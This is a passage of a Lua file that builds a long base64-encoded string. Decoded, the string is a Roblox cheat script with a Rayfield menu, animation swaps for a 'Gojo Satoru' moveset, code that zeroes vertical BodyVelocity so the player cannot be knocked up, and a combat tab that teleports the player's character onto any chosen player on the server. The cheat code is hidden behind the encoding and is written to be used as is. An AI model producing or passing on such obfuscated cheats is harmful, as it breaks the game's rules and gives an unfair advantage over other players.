+.."SUQg4oaSIHJlcGxhY2VtZW50IGFuaW0gSUQsIHNwZWVkLCBzdGFydFRpbWUpCiAgICAgICAgbG9jYWwgc2ltcGxlU3dhcHMgPSB7
+.."CiAgICAgICAgICAgIHsgc3JjPTEwNDY4NjY1OTkxLCBkc3Q9IjEzMDczNzQ1ODM1IiwgICBzcGQ9MC45LCBzdD0wLCAgIGFkalNw
+.."ZDA9MC4xIH0sCiAgICAgICAgICAgIHsgc3JjPTEwNDY2OTc0ODAwLCBkc3Q9IjEzNTYwMzA2NTEwIiwgICBzcGQ9MywgICBzdD0w
+.."LCAgIGFkalNwZDA9NCAgIH0sCiAgICAgICAgICAgIHsgc3JjPTEwNDcxMzM2NzM3LCBkc3Q9IjEwNDY5NjQzNjQzIiwgICBzcGQ9
+.."MSwgICBzdD0wLjUsIGFkalNwZDA9MCwgIHN0b3BBZnRlcj0xLjggfSwKICAgICAgICAgICAgeyBzcmM9MTI1MTAxNzA5ODgsIGRz
+.."dD0iMTM4MTM5NTUxNDkiLCAgIHNwZD0xLCAgIHN0PTAsICAgYWRqU3BkMD0wICAgfSwKICAgICAgICAgICAgeyBzcmM9MTEzNDMz
+.."MTgxMzQsIGRzdD0iMTI5ODMzMzM3MzMiLCAgIHNwZD0wLjUsIHN0PTIsICAgYWRqU3BkMD0wICAgfSwKICAgICAgICAgICAgeyBz
+.."cmM9MTU5NTUzOTM4NzIsIGRzdD0iMTU5NDM5MTU4NzciLCAgIHNwZD0xLCAgIHN0PTAuMDUsYWRqU3BkMD0wICAgfSwKICAgICAg
+.."ICAgICAgeyBzcmM9MTI5ODMzMzM3MzMsIGRzdD0iMTMwNzM3NDU4MzUiLCAgIHNwZD0wLjIsIHN0PTAsICAgYWRqU3BkMD0wICAg
+.."fSwKICAgICAgICAgICAgeyBzcmM9MTI0NDc3MDc4NDQsIGRzdD0iMTg0MzUzMDM3NDYiLCAgIHNwZD0xLCAgIHN0PTAsICAgYWRq
+.."U3BkMD0wICAgfSwKICAgICAgICAgICAgeyBzcmM9MTA0NzkzMzUzOTcsIGRzdD0iMTc4MzgwMDY4MzkiLCAgIHNwZD0wLjcsIHN0
+.."PTAsICAgYWRqU3BkMD0wLCAgc3RvcEFmdGVyPTEuMiB9LAogICAgICAgICAgICB7IHNyYz0xMDUwMzM4MTIzOCwgZHN0PSIxNDkw
+.."MDE2ODcyMCIsICAgc3BkPTAuNywgc3Q9MS4zLCBhZGpTcGQwPTAgICB9LAogICAgICAgICAgICB7IHNyYz0xMDQ3MDEwNDI0Miwg
+.."ZHN0PSIxMjQ0NzI0NzQ4MyIsICAgc3BkPTYsICAgc3Q9MCwgICBhZGpTcGQwPTAsICB3YWl0QmVmb3JlPTAuMiB9LAogICAgICAg
+.."IH0KCiAgICAgICAgZm9yIF8sIHMgaW4gaXBhaXJzKHNpbXBsZVN3YXBzKSBkbwogICAgICAgICAgICBsb2NhbCBzd2FwID0gcwog
+.."ICAgICAgICAgICBodW0uQW5pbWF0aW9uUGxheWVkOkNvbm5lY3QoZnVuY3Rpb24odHJhY2spCiAgICAgICAgICAgICAgICBpZiB0
+.."cmFjay5BbmltYXRpb24uQW5pbWF0aW9uSWQgPT0gInJieGFzc2V0aWQ6Ly8iIC4uIHN3YXAuc3JjIHRoZW4KICAgICAgICAgICAg
+.."ICAgICAgICBmb3IgXywgdCBpbiBwYWlycyhodW06R2V0UGxheWluZ0FuaW1hdGlvblRyYWNrcygpKSBkbyB0OlN0b3AoKSBlbmQK
+.."ICAgICAgICAgICAgICAgICAgICBsb2NhbCBhID0gSW5zdGFuY2UubmV3KCJBbmltYXRpb24iKQogICAgICAgICAgICAgICAgICAg
+.."IGEuQW5pbWF0aW9uSWQgPSAicmJ4YXNzZXRpZDovLyIgLi4gc3dhcC5kc3QKICAgICAgICAgICAgICAgICAgICBsb2NhbCBsb2Fk
+.."ZWQgPSBodW06TG9hZEFuaW1hdGlvbihhKQogICAgICAgICAgICAgICAgICAgIGlmIHN3YXAud2FpdEJlZm9yZSB0aGVuIHRhc2su
+.."d2FpdChzd2FwLndhaXRCZWZvcmUpIGVuZAogICAgICAgICAgICAgICAgICAgIGxvYWRlZDpQbGF5KCkKICAgICAgICAgICAgICAg
+.."ICAgICBsb2FkZWQ6QWRqdXN0U3BlZWQoc3dhcC5hZGpTcGQwIG9yIDApCiAgICAgICAgICAgICAgICAgICAgbG9hZGVkLlRpbWVQ
+.."b3NpdGlvbiA9IHN3YXAuc3QKICAgICAgICAgICAgICAgICAgICBsb2FkZWQ6QWRqdXN0U3BlZWQoc3dhcC5zcGQpCiAgICAgICAg
+.."ICAgICAgICAgICAgaWYgc3dhcC5zdG9wQWZ0ZXIgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICB0YXNrLmRlbGF5KHN3YXAu
+.."c3RvcEFmdGVyLCBmdW5jdGlvbigpIGxvYWRlZDpTdG9wKCkgZW5kKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAg
+.."ICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkKICAgICAgICBlbmQKCiAgICAgICAgLS0gUXVldWVkIGFuaW1hdGlvbiBzZXQgKE0x
+.."IGNoYWluKQogICAgICAgIGxvY2FsIHN0b3BTZXQgPSB7WzE3ODU5MDE1Nzg4XT10cnVlLFsxMDQ2OTQ5MzI3MF09dHJ1ZSxbMTA0
+.."Njk2MzA5NTBdPXRydWUsCiAgICAgICAgICAgICAgICAgICAgICAgICBbMTA0Njk2MzkyMjJdPXRydWUsWzEwNDY5NjQzNjQzXT10
+.."cnVlfQogICAgICAgIGxvY2FsIHJlcE1hcCAgPSB7CiAgICAgICAgICAgIFsiMTc4NTkwMTU3ODgiXT0icmJ4YXNzZXRpZDovLzEy
+.."Njg0MTg1OTcxIiwKICAgICAgICAgICAgWyIxMDQ2OTY0MzY0MyJdPSJyYnhhc3NldGlkOi8vMTc4ODkyOTA1NjkiLAogICAgICAg
+.."ICAgICBbIjEwNDY5NjM5MjIyIl09InJieGFzc2V0aWQ6Ly8xNzg4OTQ3MTA5OCIsCiAgICAgICAgICAgIFsiMTA0Njk2MzA5NTAi
+.."XT0icmJ4YXNzZXRpZDovLzE3ODg5NDYxODEwIiwKICAgICAgICAgICAgWyIxMDQ2OTQ5MzI3MCJdPSJyYnhhc3NldGlkOi8vMTc4
+.."ODk0NTg1NjMiLAogICAgICAgICAgICBbIjExMzY1NTYzMjU1Il09InJieGFzc2V0aWQ6Ly8xNDUxNjI3MzUwMSIsCiAgICAgICAg
+.."fQogICAgICAgIGxvY2FsIHF1ZXVlMiwgaXNBbmltID0ge30sIGZhbHNlCiAgICAgICAgbG9jYWwgZnVuY3Rpb24gcGxheVJlcChh
+.."bmltSWQpCiAgICAgICAgICAgIGlmIGlzQW5pbSB0aGVuIHRhYmxlLmluc2VydChxdWV1ZTIsIGFuaW1JZCk7IHJldHVybiBlbmQK
+.."ICAgICAgICAgICAgaXNBbmltID0gdHJ1ZQogICAgICAgICAgICBsb2NhbCByZXAgPSByZXBNYXBbdG9zdHJpbmcoYW5pbUlkKV0K
+.."ICAgICAgICAgICAgaWYgcmVwIHRoZW4KICAgICAgICAgICAgICAgIGxvY2FsIGEgPSBJbnN0YW5jZS5uZXcoIkFuaW1hdGlvbiIp
+.."OyBhLkFuaW1hdGlvbklkID0gcmVwCiAgICAgICAgICAgICAgICBsb2NhbCBsb2FkZWQgPSBodW06TG9hZEFuaW1hdGlvbihhKTsg
+.."bG9hZGVkOlBsYXkoKQogICAgICAgICAgICAgICAgbG9hZGVkLlN0b3BwZWQ6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAg
+.."ICAgICAgICAgaXNBbmltID0gZmFsc2UKICAgICAgICAgICAgICAgICAgICBpZiAjcXVldWUyID4gMCB0aGVuIHBsYXlSZXAodGFi
+.."bGUucmVtb3ZlKHF1ZXVlMiwxKSkgZW5kCiAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgIGVsc2UgaXNBbmltID0gZmFs
+.."c2UgZW5kCiAgICAgICAgZW5kCiAgICAgICAgaHVtLkFuaW1hdGlvblBsYXllZDpDb25uZWN0KGZ1bmN0aW9uKHRyYWNrKQogICAg
+.."ICAgICAgICBsb2NhbCBpZCA9IHRvbnVtYmVyKHRyYWNrLkFuaW1hdGlvbi5BbmltYXRpb25JZDptYXRjaCgiJWQrIikpCiAgICAg
+.."ICAgICAgIGlmIHN0b3BTZXRbaWRdIHRoZW4KICAgICAgICAgICAgICAgIGZvciBfLCB0IGluIGlwYWlycyhodW06R2V0UGxheWlu
+.."Z0FuaW1hdGlvblRyYWNrcygpKSBkbwogICAgICAgICAgICAgICAgICAgIGlmIHN0b3BTZXRbdG9udW1iZXIodC5BbmltYXRpb24u
+.."QW5pbWF0aW9uSWQ6bWF0Y2goIiVkKyIpKV0gdGhlbiB0OlN0b3AoKSBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAg
+.."ICAgICAgdHJhY2s6U3RvcCgpOyBwbGF5UmVwKGlkKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCgogICAgICAgIC0tIEJs
+.."b2NrIFkgQm9keVZlbG9jaXR5IChwcmV2ZW50IGxhdW5jaCkKICAgICAgICBsb2NhbCBmdW5jdGlvbiBwYXRjaEJWKGQpCiAgICAg
+.."ICAgICAgIGlmIGQ6SXNBKCJCb2R5VmVsb2NpdHkiKSB0aGVuCiAgICAgICAgICAgICAgICBkLlZlbG9jaXR5ID0gVmVjdG9yMy5u
+.."ZXcoZC5WZWxvY2l0eS5YLCAwLCBkLlZlbG9jaXR5LlopCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgICAgIGZvciBf
+.."LCBkIGluIHBhaXJzKGNoYXI6R2V0RGVzY2VuZGFudHMoKSkgZG8gcGF0Y2hCVihkKSBlbmQKICAgICAgICBjaGFyLkRlc2NlbmRh
+.."bnRBZGRlZDpDb25uZWN0KHBhdGNoQlYpCgogICAgICAgIFJheWZpZWxkOk5vdGlmeSh7IFRpdGxlPSJNb3Zlc2V0IiwgQ29udGVu
+.."dD0iR29qbyBTYXRvcnUgbG9hZGVkISIsIER1cmF0aW9uPTMsIEltYWdlPTQ0ODMzNjI0NTggfSkKICAgIGVuZCkKZW5kCgptb3Zl
+.."c2V0VGFiOkNyZWF0ZUJ1dHRvbih7IE5hbWUgPSAiR29qbyBTYXRvcnUiLCBDYWxsYmFjayA9IHJ1bkdvam9Nb3Zlc2V0IH0pCgpt
+.."b3Zlc2V0VGFiOkNyZWF0ZURpdmlkZXIoKQptb3Zlc2V0VGFiOkNyZWF0ZUxhYmVsKCJNb3Zlc2V0cyB1cGRhdGUgc29vbi4iKQoK
+.."LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+.."LS0tLQotLSDilZDilZDilZAgVEFCOiBDT01CQVQg4pWQ4pWQ4pWQCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+.."LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KbG9jYWwgYXV0b0Zhcm1UYWIgPSBXaW5kb3c6Q3Jl
+.."YXRlVGFiKCLimpQgQ29tYmF0IiwgInphcCIpCgotLSDilIDilIAgVFAgdG8gUGxheWVyIChwbGF5ZXIgcGlja2VyIHBvcHVwKSDi
+.."lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi
+.."lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAKYXV0b0Zhcm1UYWI6Q3JlYXRlU2VjdGlvbigiVGVs
+.."ZXBvcnQgdG8gUGxheWVyIikKYXV0b0Zhcm1UYWI6Q3JlYXRlTGFiZWwoIk9wZW5zIGEgbGlzdCBvZiBhbGwgcGxheWVycyBvbiB0
+.."aGUgc2VydmVyLiBDbGljayBhIG5hbWUgdG8gdGVsZXBvcnQuIikKCi0tIFBsYXllciBwaWNrZXIgcG9wdXAgKHNlcGFyYXRlIFNj
+.."cmVlbkd1aSBzbyBpdCBmbG9hdHMgYWJvdmUgdGhlIG1haW4gd2luZG93KQpsb2NhbCBwaWNrZXJHdWkgPSBJbnN0YW5jZS5uZXco
+.."IlNjcmVlbkd1aSIpCnBpY2tlckd1aS5OYW1lICAgICAgICAgICA9ICJCSF9QbGF5ZXJQaWNrZXIiCnBpY2tlckd1aS5SZXNldE9u
+.."U3Bhd24gICA9IGZhbHNlCnBpY2tlckd1aS5aSW5kZXhCZWhhdmlvciA9IEVudW0uWkluZGV4QmVoYXZpb3IuU2libGluZwpwY2Fs
+.."bChmdW5jdGlvbigpIHBpY2tlckd1aS5QYXJlbnQgPSBnYW1lOkdldFNlcnZpY2UoIkNvcmVHdWkiKSBlbmQpCmlmIG5vdCBwaWNr
+.."ZXJHdWkuUGFyZW50IHRoZW4KICAgIHBpY2tlckd1aS5QYXJlbnQgPSBMb2NhbFBsYXllcjpXYWl0Rm9yQ2hpbGQoIlBsYXllckd1
+.."aSIpCmVuZAoKbG9jYWwgcGlja2VyRnJhbWUgPSBJbnN0YW5jZS5uZXcoIkZyYW1lIiwgcGlja2VyR3VpKQpwaWNrZXJGcmFtZS5O
+.."YW1lICAgICAgICAgICAgID0gIlBpY2tlciIKcGlja2VyRnJhbWUuU2l6ZSAgICAgICAgICAgICA9IFVEaW0yLm5ldygwLCAyMDAs
+.."IDAsIDI0MCkKcGlja2VyRnJhbWUuUG9zaXRpb24gICAgICAgICA9IFVEaW0yLm5ldygwLjUsIC0xMDAsIDAuNSwgLTEyMCkKcGlj
+.."a2VyRnJhbWUuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDEwLCAxMiwgMjgpCnBpY2tlckZyYW1lLkJvcmRlclNp
+.."emVQaXhlbCAgPSAwCnBpY2tlckZyYW1lLlZpc2libGUgICAgICAgICAgPSBmYWxzZQpwaWNrZXJGcmFtZS5BY3RpdmUgICAgICAg
+.."ICAgID0gdHJ1ZQpJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIiwgcGlja2VyRnJhbWUpLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAs
+.."IDgpCmxvY2FsIHBrU3Ryb2tlID0gSW5zdGFuY2UubmV3KCJVSVN0cm9rZSIsIHBpY2tlckZyYW1lKQpwa1N0cm9rZS5Db2xvciAg
+.."ICAgPSBDb2xvcjMuZnJvbVJHQigwLCAyMDAsIDI1NSkKcGtTdHJva2UuVGhpY2tuZXNzID0gMQoKLS0gRHJhZyBmb3IgcGlja2Vy
+.."CmxvY2FsIHBrRHJhZywgcGtEcmFnU3RhcnQsIHBrRHJhZ1BvcyA9IGZhbHNlLCBuaWwsIG5pbApsb2NhbCBwa1RpdGxlQmFyID0g
+.."SW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiLCBwaWNrZXJGcmFtZSkKcGtUaXRsZUJhci5TaXplICAgICAgICAgICAgICAgPSBVRGlt
+.."Mi5uZXcoMSwgLTMwLCAwLCAyOCkKcGtUaXRsZUJhci5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQpwa1RpdGxlQmFyLlRleHQg
+.."ICAgICAgICAgICAgICA9ICJTZWxlY3QgUGxheWVyIgpwa1RpdGxlQmFyLlRleHRDb2xvcjMgICAgICAgICA9IENvbG9yMy5mcm9t
+.."UkdCKDAsIDIwMCwgMjU1KQpwa1RpdGxlQmFyLkZvbnQgICAgICAgICAgICAgICA9IEVudW0uRm9udC5Hb3RoYW1Cb2xkCnBrVGl0
+.."bGVCYXIuVGV4dFNpemUgICAgICAgICAgID0gMTMKcGtUaXRsZUJhci5UZXh0WEFsaWdubWVudCAgICAgPSBFbnVtLlRleHRYQWxp
+.."Z25tZW50LkxlZnQKcGtUaXRsZUJhci5Qb3NpdGlvbiAgICAgICAgICAgPSBVRGltMi5uZXcoMCwgOCwgMCwgMCkKCmxvY2FsIHBr
+.."Q2xvc2UgPSBJbnN0YW5jZS5uZXcoIlRleHRCdXR0b24iLCBwaWNrZXJGcmFtZSkKcGtDbG9zZS5TaXplICAgICAgICAgICAgID0g
+.."VURpbTIubmV3KDAsIDIyLCAwLCAyMikKcGtDbG9zZS5Qb3NpdGlvbiAgICAgICAgID0gVURpbTIubmV3KDEsIC0yNiwgMCwgMykK
+.."cGtDbG9zZS5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMTkwLCA0MCwgNDApCnBrQ2xvc2UuVGV4dCAgICAgICAg
+.."ICAgICA9ICLinJUiCnBrQ2xvc2UuVGV4dENvbG9yMyAgICAgICA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpCnBrQ2xv
+.."c2UuRm9udCAgICAgICAgICAgICA9IEVudW0uRm9udC5Hb3RoYW1Cb2xkCnBrQ2xvc2UuVGV4dFNpemUgICAgICAgICA9IDExCklu
+.."c3RhbmNlLm5ldygiVUlDb3JuZXIiLCBwa0Nsb3NlKS5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygwLCA0KQpwa0Nsb3NlLk1vdXNl
+.."QnV0dG9uMUNsaWNrOkNvbm5lY3QoZnVuY3Rpb24oKSBwaWNrZXJGcmFtZS5WaXNpYmxlID0gZmFsc2UgZW5kKQoKLS0gUGlja2Vy
+.."IGRyYWcKcGlja2VyRnJhbWUuSW5wdXRCZWdhbjpDb25uZWN0KGZ1bmN0aW9uKGlucCkKICAgIGlmIGlucC5Vc2VySW5wdXRUeXBl
+.."ID09IEVudW0uVXNlcklucHV0VHlwZS5Nb3VzZUJ1dHRvbjEgdGhlbgogICAgICAgIHBrRHJhZyAgICAgID0gdHJ1ZQogICAgICAg
+.."IHBrRHJhZ1N0YXJ0ID0gVXNlcklucHV0U2VydmljZTpHZXRNb3VzZUxvY2F0aW9uKCkKICAgICAgICBwa0RyYWdQb3MgICA9IHBp
+.."Y2tlckZyYW1lLlBvc2l0aW9uCiAgICBlbmQKZW5kKQpVc2VySW5wdXRTZXJ2aWNlLklucHV0Q2hhbmdlZDpDb25uZWN0KGZ1bmN0
+.."aW9uKGlucCkKICAgIGlmIHBrRHJhZyBhbmQgaW5wLlVzZXJJbnB1dFR5cGUgPT0gRW51bS5Vc2VySW5wdXRUeXBlLk1vdXNlTW92
+.."ZW1lbnQgdGhlbgogICAgICAgIGxvY2FsIGN1ciAgID0gVXNlcklucHV0U2VydmljZTpHZXRNb3VzZUxvY2F0aW9uKCkKICAgICAg
+.."ICBsb2NhbCBkZWx0YSA9IGN1ciAtIHBrRHJhZ1N0YXJ0CiAgICAgICAgcGlja2VyRnJhbWUuUG9zaXRpb24gPSBVRGltMi5uZXco
+.."CiAgICAgICAgICAgIHBrRHJhZ1Bvcy5YLlNjYWxlLCBwa0RyYWdQb3MuWC5PZmZzZXQgKyBkZWx0YS5YLAogICAgICAgICAgICBw
+.."a0RyYWdQb3MuWS5TY2FsZSwgcGtEcmFnUG9zLlkuT2Zmc2V0ICsgZGVsdGEuWQogICAgICAgICkKICAgIGVuZAplbmQpClVzZXJJ
+.."bnB1dFNlcnZpY2UuSW5wdXRFbmRlZDpDb25uZWN0KGZ1bmN0aW9uKGlucCkKICAgIGlmIGlucC5Vc2VySW5wdXRUeXBlID09IEVu
+.."dW0uVXNlcklucHV0VHlwZS5Nb3VzZUJ1dHRvbjEgdGhlbiBwa0RyYWcgPSBmYWxzZSBlbmQKZW5kKQoKLS0gRGl2aWRlciBsaW5l
+.."IHVuZGVyIHRpdGxlCmxvY2FsIHBrTGluZSA9IEluc3RhbmNlLm5ldygiRnJhbWUiLCBwaWNrZXJGcmFtZSkKcGtMaW5lLlNpemUg
+.."ICAgICAgICAgICAgPSBVRGltMi5uZXcoMSwgLTgsIDAsIDEpCnBrTGluZS5Qb3NpdGlvbiAgICAgICAgID0gVURpbTIubmV3KDAs
+.."IDQsIDAsIDI4KQpwa0xpbmUuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDAsIDIwMCwgMjU1KQpwa0xpbmUuQmFj
+.."a2dyb3VuZFRyYW5zcGFyZW5jeSA9IDAuNgpwa0xpbmUuQm9yZGVyU2l6ZVBpeGVsICA9IDAKCi0tIFNjcm9sbGFibGUgcGxheWVy
+.."IGxpc3QKbG9jYWwgcGtTY3JvbGwgPSBJbnN0YW5jZS5uZXcoIlNjcm9sbGluZ0ZyYW1lIiwgcGlja2VyRnJhbWUpCnBrU2Nyb2xs
+.."LlNpemUgICAgICAgICAgICAgICAgICAgPSBVRGltMi5uZXcoMSwgLTgsIDEsIC0zNikKcGtTY3JvbGwuUG9zaXRpb24gICAgICAg
+.."ICAgICAgICA9IFVEaW0yLm5ldygwLCA0LCAwLCAzMikKcGtTY3JvbGwuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKcGtTY3Jv
+.."bGwuQm9yZGVyU2l6ZVBpeGVsICAgICAgICA9IDAKcGtTY3JvbGwuU2Nyb2xsQmFyVGhpY2tuZXNzICAgICA9IDMKcGtTY3JvbGwu
+.."U2Nyb2xsQmFySW1hZ2VDb2xvcjMgICA9IENvbG9yMy5mcm9tUkdCKDAsIDIwMCwgMjU1KQpwa1Njcm9sbC5DYW52YXNTaXplICAg
+.."ICAgICAgICAgID0gVURpbTIubmV3KDAsIDAsIDAsIDApCmxvY2FsIHBrTGF5b3V0ID0gSW5zdGFuY2UubmV3KCJVSUxpc3RMYXlv
+.."dXQiLCBwa1Njcm9sbCkKcGtMYXlvdXQuUGFkZGluZyAgID0gVURpbS5uZXcoMCwgMykKcGtMYXlvdXQuU29ydE9yZGVyID0gRW51
+.."bS5Tb3J0T3JkZXIuTGF5b3V0T3JkZXIKcGtMYXlvdXQ6R2V0UHJvcGVydHlDaGFuZ2VkU2lnbmFsKCJBYnNvbHV0ZUNvbnRlbnRT
+.."aXplIik6Q29ubmVjdChmdW5jdGlvbigpCiAgICBwa1Njcm9sbC5DYW52YXNTaXplID0gVURpbTIubmV3KDAsIDAsIDAsIHBrTGF5
+.."b3V0LkFic29sdXRlQ29udGVudFNpemUuWSArIDYpCmVuZCkKCmxvY2FsIGZ1bmN0aW9uIG9wZW5QbGF5ZXJQaWNrZXIoKQogICAg
+.."LS0gUmVidWlsZCBsaXN0IGZyZXNoIGVhY2ggdGltZQogICAgZm9yIF8sIGMgaW4gaXBhaXJzKHBrU2Nyb2xsOkdldENoaWxkcmVu
+.."KCkpIGRvCiAgICAgICAgaWYgYzpJc0EoIlRleHRCdXR0b24iKSB0aGVuIGM6RGVzdHJveSgpIGVuZAogICAgZW5kCiAgICBsb2Nh
+.."bCBvcmRlciA9IDAKICAgIGZvciBfLCBwbHIgaW4gaXBhaXJzKFBsYXllcnM6R2V0UGxheWVycygpKSBkbwogICAgICAgIGlmIHBs
+.."ciB+PSBMb2NhbFBsYXllciB0aGVuCiAgICAgICAgICAgIG9yZGVyID0gb3JkZXIgKyAxCiAgICAgICAgICAgIGxvY2FsIHBiID0g
+.."SW5zdGFuY2UubmV3KCJUZXh0QnV0dG9uIiwgcGtTY3JvbGwpCiAgICAgICAgICAgIHBiLlNpemUgICAgICAgICAgICAgPSBVRGlt
+.."Mi5uZXcoMSwgMCwgMCwgMzApCiAgICAgICAgICAgIHBiLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigxNCwgMTgs
+.."IDM2KQogICAgICAgICAgICBwYi5Cb3JkZXJTaXplUGl4ZWwgID0gMAogICAgICAgICAgICBwYi5UZXh0ICAgICAgICAgICAgID0g
+.."cGxyLk5hbWUKICAgICAgICAgICAgcGIuVGV4dENvbG9yMyAgICAgICA9IENvbG9yMy5mcm9tUkdCKDIxNSwgMjMwLCAyNTUpCiAg
+.."ICAgICAgICAgIHBiLkZvbnQgICAgICAgICAgICAgPSBFbnVtLkZvbnQuR290aGFtCiAgICAgICAgICAgIHBiLlRleHRTaXplICAg
+.."ICAgICAgPSAxMgogICAgICAgICAgICBwYi5MYXlvdXRPcmRlciAgICAgID0gb3JkZXIKICAgICAgICAgICAgSW5zdGFuY2UubmV3
+.."KCJVSUNvcm5lciIsIHBiKS5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygwLCA1KQogICAgICAgICAgICBsb2NhbCBwYlN0cm9rZSA9
+.."IEluc3RhbmNlLm5ldygiVUlTdHJva2UiLCBwYikKICAgICAgICAgICAgcGJTdHJva2UuQ29sb3IgICAgID0gQ29sb3IzLmZyb21S
+.."R0IoMzAsIDQwLCA4MCkKICAgICAgICAgICAgcGJTdHJva2UuVGhpY2tuZXNzID0gMQogICAgICAgICAgICBwYi5Nb3VzZUVudGVy
+.."OkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgcGIuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDAs
+.."IDUwLCA5MCkKICAgICAgICAgICAgICAgIHBiU3Ryb2tlLkNvbG9yICAgICAgPSBDb2xvcjMuZnJvbVJHQigwLCAyMDAsIDI1NSkK
+.."ICAgICAgICAgICAgZW5kKQogICAgICAgICAgICBwYi5Nb3VzZUxlYXZlOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICAg
+.."ICAgcGIuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDE0LCAxOCwgMzYpCiAgICAgICAgICAgICAgICBwYlN0cm9r
+.."ZS5Db2xvciAgICAgID0gQ29sb3IzLmZyb21SR0IoMzAsIDQwLCA4MCkKICAgICAgICAgICAgZW5kKQogICAgICAgICAgICBsb2Nh
+.."bCBjYXB0dXJlZFBsciA9IHBscgogICAgICAgICAgICBwYi5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKICAg
+.."ICAgICAgICAgICAgIHBpY2tlckZyYW1lLlZpc2libGUgPSBmYWxzZQogICAgICAgICAgICAgICAgbG9jYWwgbXlIUlAgPSBodW1h
+.."bm9pZFJvb3RQYXJ0CiAgICAgICAgICAgICAgICBpZiBub3QgbXlIUlAgdGhlbgogICAgICAgICAgICAgICAgICAgIFJheWZpZWxk
+.."Ok5vdGlmeSh7IFRpdGxlPSJDb21iYXQiLCBDb250ZW50PSJObyBjaGFyYWN0ZXIhIiwgRHVyYXRpb249MywgSW1hZ2U9NDQ4MzM2
+.."MjQ1OCB9KQogICAgICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBsb2Nh
+.."bCB0Q2hhciA9IGNhcHR1cmVkUGxyLkNoYXJhY3RlcgogICAgICAgICAgICAgICAgbG9jYWwgdEhSUCAgPSB0Q2hhciBhbmQgdENo
+.."YXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgICAgICAgICAgICAgaWYgbm90IHRIUlAgdGhlbgogICAg
+.."ICAgICAgICAgICAgICAgIFJheWZpZWxkOk5vdGlmeSh7IFRpdGxlPSJDb21iYXQiLCBDb250ZW50PWNhcHR1cmVkUGxyLk5hbWUg
+.."Li4gIiBoYXMgbm8gY2hhcmFjdGVyISIsIER1cmF0aW9uPTMsIEltYWdlPTQ0ODMzNjI0NTggfSkKICAgICAgICAgICAgICAgICAg
+.."ICByZXR1cm4KICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgbXlIUlAuQ0ZyYW1lID0gdEhSUC5DRnJhbWUgKyBW
+.."ZWN0b3IzLm5ldygwLCAzLCAwKQogICAgICAgICAgICAgICAgUmF5ZmllbGQ6Tm90aWZ5KHsgVGl0bGU9IkNvbWJhdCIsIENvbnRl
+.."bnQ9IlRlbGVwb3J0ZWQgdG8gIiAuLiBjYXB0dXJlZFBsci5OYW1lLCBEdXJhdGlvbj0zLCBJbWFnZT00NDgzMzYyNDU4IH0pCiAg
+.."ICAgICAgICAgIGVuZCkKICAgICAgICBlbmQKICAgIGVuZAogICAgaWYgb3JkZXIgPT0gMCB0aGVuCiAgICAgICAgbG9jYWwgbm9i
+.."ID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiLCBwa1Njcm9sbCkKICAgICAgICBub2IuU2l6ZSA9IFVEaW0yLm5ldygxLCAwLCAw
+.."LCAzMCkKICAgICAgICBub2IuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKICAgICAgICBub2IuVGV4dCA9ICJObyBvdGhlciBw
+.."bGF5ZXJzIgogICAgICAgIG5vYi5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMTMwLCAxNTAsIDE5MCkKICAgICAgICBub2Iu
+.."Rm9udCA9IEVudW0uRm9udC5Hb3RoYW0KICAgICAgICBub2IuVGV4dFNpemUgPSAxMgogICAgICAgIG5vYi5MYXlvdXRPcmRlciA9
+.."IDEKICAgIGVuZAogICAgcGlja2VyRnJhbWUuVmlzaWJsZSA9IHRydWUKZW5kCgphdXRvRmFybVRhYjpDcmVhdGVCdXR0b24oewog
+.."ICAgTmFtZSA9ICJTZWxlY3QgUGxheWVyICYgVGVsZXBvcnQiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpIG9wZW5QbGF5ZXJQ
+.."aWNrZXIoKSBlbmQsCn0pCgotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
